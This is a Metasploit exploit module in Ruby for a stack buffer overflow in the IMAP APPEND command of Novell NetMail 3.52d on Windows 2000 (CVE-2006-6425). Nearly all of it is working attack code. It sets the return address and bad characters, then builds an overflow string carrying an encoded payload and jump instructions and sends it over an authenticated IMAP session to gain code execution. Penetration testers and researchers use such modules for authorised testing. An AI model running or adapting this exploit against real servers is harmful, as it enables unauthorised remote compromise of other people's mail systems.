##
# $Id: novell_netmail_append.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Imap

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell NetMail <= 3.52d IMAP APPEND Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Novell's Netmail 3.52 IMAP APPEND
				verb. By sending an overly long string, an attacker can overwrite the
				buffer and control program execution.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2006-6425' ],
					[ 'OSVDB', '31362' ],
					[ 'BID', '21723' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-06-054.html' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 700,
					'BadChars' => "\x00\x0a\x0d\x20",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows 2000 SP0-SP4 English',   { 'Ret' => 0x75022ac4 }],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 23 2006'))

	end

	def exploit
		sploit =  "a002 APPEND  " + "saved-messages (\Seen) "
		sploit << rand_text_english(1358) + payload.encoded + "\xeb\x06"
		sploit << rand_text_english(2) + [target.ret].pack('V')
		sploit << [0xe9, -585].pack('CV') + rand_text_english(150)

		info = connect_login

		if (info == true)
			print_status("Trying target #{target.name}...")
			sock.put(sploit + "\r\n")
		else
			print_status("Not falling through with exploit")
		end

		handler
		disconnect
	end
end
